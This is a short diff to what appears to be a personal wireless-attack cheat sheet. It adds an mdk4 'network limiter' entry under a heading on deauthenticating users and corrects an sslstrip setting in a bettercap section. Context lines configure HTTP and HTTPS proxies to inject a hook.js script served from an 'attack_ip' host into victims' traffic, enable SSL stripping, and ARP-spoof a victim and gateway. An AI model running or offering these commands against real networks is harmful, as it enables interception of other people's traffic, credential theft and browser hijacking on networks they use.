@@ -370,6 +370,9 @@ max
 
 ---------------------------------------------[DISCOVER / DEAUTH USERS]---------------------------------------------
 
+[MDK4 -- ULTIMATE NETWORK LIMITER]
+* sudo mdk4 
+
 [WASH: networks using the monitor mode interface-- such as printers]
 * sudo wash -i wlan2 -c 6
   
@@ -475,7 +478,7 @@ deauth using  mdk4
   * set http.proxy.injectjs http://attack_ip:3000/hook.js
   * set https.proxy.injectjs https://attack_ip:3000/hook.js
   * set https.proxy.sslstrip true
-  * set https.proxy.sslstrip true
+  * set http.proxy.sslstrip true
   * http.proxy on
   * https.proxy on
   * set arp.spoof.targets 192.victim_ip, 192.gateway_ip
